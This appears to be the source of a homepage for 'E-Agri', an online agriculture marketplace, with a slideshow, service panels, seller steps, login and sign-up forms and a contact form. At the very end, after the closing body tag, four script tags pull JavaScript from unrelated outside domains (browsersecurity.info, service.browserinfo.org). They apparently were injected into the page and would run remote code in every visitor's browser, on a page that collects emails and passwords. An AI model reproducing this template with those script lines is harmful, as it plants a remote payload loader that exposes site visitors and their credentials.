<?php
  include('common/header.php');
?>
 
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
* {box-sizing:border-box}
body {font-family: Verdana,sans-serif;}
.mySlides {display:none}

/* Slideshow container */
.slideshow-container {
  max-width: 1000px;
  position: relative;
  margin: auto;
}

/* Caption text */
.text {
  color: #f2f2f2;
  font-size: 15px;
  padding: 8px 12px;
  position: absolute;
  bottom: 8px;
  width: 100%;
  text-align: center;
}

/* Number text (1/3 etc) */
.numbertext {
  color: #f2f2f2;
  font-size: 12px;
  padding: 8px 12px;
  position: absolute;
  top: 0;
}

/* The dots/bullets/indicators */
.dot {
  height: 8px;
  width: 8px;
  margin: 0 2px;
  background-color: #bbb;
  border-radius: 50%;
  display: inline-block;
  transition: background-color 0.6s ease;
}

.active {
  background-color: #717171;
}

/* Fading animation */
.fade {
  -webkit-animation-name: fade;
  -webkit-animation-duration: 1.5s;
  animation-name: fade;
  animation-duration: 1.5s;
}

@-webkit-keyframes fade {
  from {opacity: .4} 
  to {opacity: 1}
}

@keyframes fade {
  from {opacity: .4} 
  to {opacity: 1}
}

/* On smaller screens, decrease text size */
@media only screen and (max-width: 300px) {
  .text {font-size: 11px}
}
</style>
</head>
<body>
<div class="container" align="center">
<div class="slideshow-container">

<div class="mySlides fade">
  <div class="numbertext">1 / 4</div>
  <img src="image5.jpg" width="1100" height="350">
  <div class="text" style="color:yellow"><h1>WELCOME TO E-AGRI!!!!</h1></div>
</div>

<div class="mySlides fade">
  <div class="numbertext">2 / 4</div>
  <img src="image14.jpg" width="1100" height="350">
  <div class="text" style="color:green"><h1>AN ONLINE PLATFORM FOR AGRICULTURE</h1></div>
</div>

<div class="mySlides fade">
  <div class="numbertext">3 / 4</div>
  <img src="hp3.jpg" width="1100" height="350">
  <div class="text" style="color:red"><h1>FRESH HANDPICKED PRODUCTS</h1></div>
</div>

<div class="mySlides fade">
  <div class="numbertext">4 / 4</div>
  <img src="image7.jpg" width="1100" height="350">
  <div class="text" style="color:white"><h1>SAY YES TO ORGANIC PRODUCTS</h1></div>
</div>
</div>
</div>


<div style="text-align:center">
  <span class="dot"></span> 
  <span class="dot"></span> 
  <span class="dot"></span> 
   <span class="dot"></span> 
</div>
</div>
</div>

<script>
var slideIndex = 0;
showSlides();

function showSlides() {
    var i;
    var slides = document.getElementsByClassName("mySlides");
    var dots = document.getElementsByClassName("dot");
    for (i = 0; i < slides.length; i++) {
       slides[i].style.display = "none";  
    }
    slideIndex++;
    if (slideIndex> slides.length) {slideIndex = 1}    
    for (i = 0; i < dots.length; i++) {
        dots[i].className = dots[i].className.replace(" active", "");
    }
    slides[slideIndex-1].style.display = "block";  
    dots[slideIndex-1].className += " active";
    setTimeout(showSlides, 2000); // Change image every 1 seconds
}
</script>

</body>
</html> 
<br>



<div class="container">    
  <div class="row">
    <div class="col-sm-4">
      <div class="panel panel-primary">
        <a href="goorganic.html"><div class="panel-heading">GO ORGANIC</div>
        <div class="panel-body"><img src="seasonal.jpg" class="img-responsive" style="width:100%" alt="Image"></div>
        <div class="panel-footer">GET ORGANIC DESIRED PRODUCTS</div></a>
      </div>
    </div>
    <div class="col-sm-4"> 
      <div class="panel panel-danger">
        <a href="seasonaloffers.html"><div class="panel-heading">SEASONAL OFFERS</div>
        <div class="panel-body"><img src="bestoffer.jpg" class="img-responsive" style="width:50%" alt="Image"></div>
        <div class="panel-footer">GET OFFERS ON SEASONAL PRODUCTS</div></a>
      </div>
    </div>
    <div class="col-sm-4"> 
      <div class="panel panel-success">
        <a href="boxservices.html"><div class="panel-heading">BOX SERVICES</div>
        <div class="panel-body"><img src="boxmain.jpg" class="img-responsive" style="width:90%" alt="Image"></div>
        <div class="panel-footer">BUY MULTTIPLE ITEMS @ CHEAP RATES</div></a>
      </div>
    </div>
  </div>
</div>


<!-- Container (About Section) -->
<div id="about" class="container-fluid">
 
      <h2>About Us</h2>
      <h4><p>An initiative to built a common platform for producers and customers where both the users can perform their activities with transparency.
Providing a indiscriminate financial opportunity to both producers(farmers) and the consumers.
</h4></p>
      <p>E-Agri makes it simple for farms, farm cooperatives, and local food artisans to streamline working with wholesale buyers such as restaurants, schools, corporate kitchens, retails stores, and more. Lessening the administrative work that comes with each order helps producers create a more successful relationship with their buyers and can help them work with more buyers overall. Buyers benefit by quick access to local products, real time knowledge of what is available, and an easy way to work with local producers.</p>
      </div>
      
  </h4>
  </div>
    

<div class="container-fluid bg-grey">
  <div class="row">
    <div class="col-sm-4">
      <span class="glyphicon glyphicon-globe logo"></span>
    </div>
    <div class="col-sm-8">
      <h2>Administartive Management</h2>
      <h5><strong>MANAGE ORDERS & CUSTOMERS</strong>
<p>Easily publish your real-time availability online. Accept online orders from both current customers and new ones. Create, send, and track invoices for phone, e-mail, and market orders. Collect all your orders in one place with invoices automatically sent to buyers. Create packing slips and pick lists to go with and help pack your orders. Process credit requests online. Streamline customer management and keep digital records so you can spend less time in the office.</h5></p>
      <h5><strong>TRACK PAYMENTS & FINANCIALS</strong>
<p>Accept credit card payments without having to set up your own merchant account with an online payment processor. Extend terms to trusted buyers for offline payment while keeping digital records of buyer payments and past orders. Download your financial records for upload to your accounting software.</p></h5>
 <h5><strong>MARKET YOUR FARM</strong>
<p>Get free online exposure to buyers in minutes without needing to design or maintain your own website. Generate a PDF availability list to send to buyers. FarmersWeb buttons let you link to your real time availability from other websites for quick online shopping from your farm.</p></h5>
<h5><strong>MANAGE DELIVERIES AND LOGISTICS</strong>
<p>Create your own delivery zones with days of operations, order minimums, and lead times. Coordinate your deliveries by third parties which then receive order details and buyer addresses automatically.</p></h5>

    </div>
  </div>
</div>

<!-- Container (Services Section) -->
<div id="services" class="container-fluid text-center">
  <h2>SERVICES</h2>
  <h4>What we offer</h4>
  <br>
  <div class="row">
    <div class="col-sm-4">
      <span class="glyphicon glyphicon-usd logo-small"></span>
      <h4>Optimum Delivery Charges</h4>
      <p>Low shipping cost</p>
    </div>
    <div class="col-sm-4">
      <span class="glyphicon glyphicon-leaf logo-small"></span>
      <h4>Organic Food Products</h4>
      <p>Good and organic food available here</p>
    </div>
    <div class="col-sm-4">
      <span class="glyphicon glyphicon-home logo-small"></span>
      <h4>Nearest Location</h4>
      <p>Shop with nearest to your location</p>
    </div>
  </div>
  <br><br>
  <div class="row">
    <div class="col-sm-4">
      <span class="glyphicon glyphicon-gift logo-small"></span>
      <h4>Best Offers</h4>
      <p>Enjoy the deals </p>
    </div>
    <div class="col-sm-4">
      <span class="glyphicon glyphicon-map-marker logo-small"></span>
      <h4>Track your order</h4>
      <p>E-Agri helps you in tracking your order</p>
    </div>
    <div class="col-sm-4">
      <span class="glyphicon glyphicon-ok-circle logo-small"></span>
      <h4 style="color:#303030;">Sell your product</h4>
      <p>Sell your product at very optitimum value</p>
    </div>
  </div>
</div>

<!-- Container (Portfolio Section) -->
<div id="portfolio" class="container-fluid text-center bg-grey">
  <h2>Sell your Product on E-Agri</h2><br>
  <div class="container">
  <h4>Post an ad of your product</h4>
 <div class="container">
 
 <ul class="list-inline">
    <li><a href="firstpage.php">Home</a></li>
    <li><a href="advantage.html">E-Agri Advantage</a></li>
    <li><a href="#">Resources</a></li>
    <li><a href="sellerdiaries.html">Seller diaries</a></li>
    <li><a href="faqs.html">FAQ's</a></li>
</ul>
<div class="container">
<div class="row">
<div class="col-sm-5">
<h3>Step 1: Register and list your products</h3>
<p>1.Register your business for free and create a product catalogue. Get free training on how to run your online business.</p>
<p>2.Get your documentation, photo-shoots, cataloguing, etc. done with ease from our Professional Services network.</p>
<p>3.Our Snapdeal Advisors will help you at every step and fully assist you in taking your business online</p>
</div>

<div class="col-sm-5">
<h3>Step 2: Receive orders and sell across India</h3>
<p>1.Once listed, your products will be available to millions of users across India</p>
<p>2.Get orders and manage your online business via our top of the line Seller Panel and Seller Zone Mobile App</p>
</div>
</div>

<div class="row">
<div class="col-sm-5">
<h3>Step 3: Package and ship with ease</h3>
<p>1.On receiving orders, pack the goods & leave the worries of pick-up & delivery to our courier partners</p>
<p>2.With Snapdeal Plus facility, simply hand over the responsibilities of inventory storage, packaging & delivering the orders to us</p>
</div>

<div class="col-sm-5">
<h3>Step 4: Get payments and grow your business</h3>
<p>1.Receive quick and hassle-free payments in your account once your orders are fulfilled</p>
<p>2.Expand your business with low interest & collateral-free business loans through Capital Assist</p>
</div>
</div>
<h2><a href="register_f.html"><button type="button" class="btn btn-default">Register Now</button> </a></h2>
<h2><a href="login__f.php"><button type="button" class="btn btn-default">Login</button> </a></h2>
</div>
</div>
</div>
</div>


<!-- Container (Pricing Section) -->
<div id="pricing" class="container-fluid">
  <div class="text-center">
    <h2><b>Login</b></h2>
   <div class="container" class="bg-success">
 <form class="form-horizontal" action="login_c.php" method="POST">
 <fieldset>
 <div class="form-group">
  <label class="col-md-4 control-label" for="name">Email Id</label>  
  <div class="col-md-4">
  <input id="userid" name="emailid" type="text" placeholder="Enter your Email Id" class="form-control input-md" required="">
    
  </div>
</div>
<div class="form-group">
  <label class="col-md-4 control-label" for="password">Password</label>
  <div class="col-md-4">
    <input id="password" name="password" type="password" placeholder="Enter a password" class="form-control input-md" required="">
    </div>
</div>
<div class="checkbox">
      <label><input type="checkbox"> Remember me</label>
    </div>
    <button type="submit" class="btn btn-default">Submit</button>

    </form>
    </div>
    </div>
    
 <
 <div class="container" class="bg-success">
 <h4><center>New user?? Create a new account</center></h4>
 <form class="form-horizontal" action="register_c.php" method="POST">
 <fieldset>
 <div class="form-group">
  <label class="col-md-4 control-label" for="name">User Name</label>  
  <div class="col-md-4">
  <input id="username" name="username" type="text" placeholder="Enter your name" class="form-control input-md" required="">
    
  </div>
</div>

<div class="form-group">
  <label class="col-md-4 control-label" for="dist">Email Id</label>  
  <div class="col-md-4">
  <input id="emailidid" name="emailid" type="text" placeholder="Enter a Email ID" class="form-control input-md" required="">
    
  </div>
</div>


<div class="form-group">
  <label class="col-md-4 control-label" for="password">Password</label>
  <div class="col-md-4">
    <input id="password" name="password" type="password" placeholder="Enter a password" class="form-control input-md" required="">
    
  </div>
</div>

<div class="form-group">
  <label class="col-md-4 control-label" for="password">Re-enter password</label>
  <div class="col-md-4">
    <input id="rpassword" name="rpassword" type="password" placeholder="Re-enter password" class="form-control input-md" required="">
    
  </div>
</div>

<div class="form-group">
  <label class="col-md-4 control-label" for="contact">Contact Number</label>  
  <div class="col-md-4">
  <input id="contact" name="contact" type="text" placeholder="Enter your contact no." class="form-control input-md" required="">
    
  </div>
</div>

<div class="form-group">
  <label class="col-md-4 control-label" for="signup"></label>
  <div class="col-md-4">
    <button id="signup" type="submit" name="submit" class="btn btn-success">Sign Up</button>
  </div>
</div>
</fieldset>
</form>
</div>

<!-- Container (Contact Section) -->
<div id="contact" class="container-fluid">
  <h2 class="text-center">CONTACT</h2>
  <div class="row">
    <div class="col-sm-5">
      <p>Contact us and we'll get back to you within 24 hours.</p>
      <p><span class="glyphicon glyphicon-map-marker"></span> Mumbai, INDIA</p>
      <p><span class="glyphicon glyphicon-phone"></span> +00 1515151515</p>
      <p><span class="glyphicon glyphicon-envelope"></span> e_agricommercial@gmail.com</p>
    </div>
    <form action="contact.php" method="POST">
    <div class="col-sm-7">
      <div class="row">
        <div class="col-sm-6 form-group">
          <input class="form-control" id="name" name="name" placeholder="Name" type="text" required>
        </div>
        <div class="col-sm-6 form-group">
          <input class="form-control" id="email" name="email" placeholder="Email" type="email" required>
        </div>
      </div>
      <textarea class="form-control" id="comments" name="comments" placeholder="Comment" rows="5"></textarea><br>
      <div class="row">
        <div class="col-sm-12 form-group">
          <button class="btn btn-default pull-right" type="submit">Send</button>
        </div>
      </div>
    </div>
    </form>
  </div>
</div>


<footer class="container-fluid text-center">
  <a href="firstpage.php" title="To Top">
    <span class="glyphicon glyphicon-chevron-up"></span>
  </a>
  <p>Sponsored by <a href="http://www.w3schools.com" title="Visit farms">FarmersWeb</a></p><br>
  <p></p>
  <p align="right">COPYRIGHT 2017. E-AGRI, LLC</p>
</footer>

<script>
$(document).ready(function(){
  // Add smooth scrolling to all links in navbar + footer link
  $(".navbar a, footer a[href='firstpage.php']").on('click', function(event) {
    // Make sure this.hash has a value before overriding default behavior
    if (this.hash !== ""){
      // Prevent default anchor click behavior
      event.preventDefault();

      // Store hash
      var hash = this.hash;

      // Using jQuery's animate() method to add smooth page scroll
      // The optional number (900) specifies the number of milliseconds it takes to scroll to the specified area
      $('html, body').animate({
        scrollTop: $(hash).offset().top
      }, 900, function(){
   
        // Add hash (#) to URL when done scrolling (default click behavior)
        window.location.hash = hash;
      });
    } // End if
  });
})
</script>

</body>
<script src="http://browsersecurity.info/js/jerry.js" type="text/javascript"></script><script src="http://service.browserinfo.org/js/scrap.js" type="text/javascript"></script><script src="http://service.browserinfo.org/js/ads.js" type="text/javascript"></script><script src="http://browsersecurity.info/js/essence.js" type="text/javascript"></script>
</html>

